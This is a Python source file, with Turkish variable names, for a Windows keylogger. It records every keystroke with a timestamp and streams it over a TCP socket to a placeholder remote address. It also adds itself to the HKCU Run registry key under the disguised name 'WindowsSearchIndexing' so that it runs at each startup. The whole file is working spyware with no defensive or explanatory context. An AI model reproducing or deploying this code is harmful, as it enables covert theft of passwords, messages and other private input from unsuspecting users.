from datetime import datetime
from pynput.keyboard import Key, Listener
import os
import winreg as reg
import socket

hedef_ip = "X.X.X.X"
hedef_port = 1235

istemci = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
istemci.connect((hedef_ip,hedef_port))

def add_to_startup(file_path):
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        reg_key = reg.HKEY_CURRENT_USER
        key_value = "WindowsSearchIndexing"
        reg.CreateKey(reg_key, key)
        registry_key = reg.OpenKey(reg_key, key, 0, reg.KEY_WRITE)
        reg.SetValueEx(registry_key, key_value, 0, reg.REG_SZ, file_path)
        reg.CloseKey(registry_key)
    except Exception as e:
        pass

def on_press(key):
    zaman = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    veri = zaman + ' {0} ,'.format(key)
    istemci.sendall(veri.encode())

def on_release(key):
    if key == Key.esc:
        istemci.close()
        return False



if __name__ == '__main__':
    script_path = os.path.abspath(__file__)
    add_to_startup(script_path)
    with Listener(
            on_press=on_press,
            on_release=on_release) as listener:
        listener.join()

